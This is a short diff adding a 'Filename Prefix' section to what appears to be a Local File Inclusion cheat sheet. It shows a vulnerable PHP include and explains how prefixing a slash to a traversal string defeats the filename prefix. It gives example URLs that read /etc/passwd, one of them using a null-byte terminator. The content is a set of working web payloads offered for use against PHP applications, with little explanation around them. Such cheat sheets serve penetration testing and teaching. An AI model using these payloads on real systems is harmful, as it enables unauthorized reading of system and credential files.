@@ -1,4 +1,14 @@
 ## Local File Inclusion
+### Filename Prefix
+If the following code is used to handle parameters:
+```php
+include("lang_" . $_GET['language']);
+```
+Then, if we try to traverse the directory with `../../../etc/passwd`, the final string would be `lang_../../../etc/passwd`, which is invalid.
+so, instead of directly using path traversal, we can prefix a `/` before our payload, and this should consider the prefix as a directory.
+```txt
+http://example.com/index.php?language=/../../../../etc/passwd
+```
 ### Null byte
 ```txt
 http://example.com/index.php?page=../../../etc/passwd%00
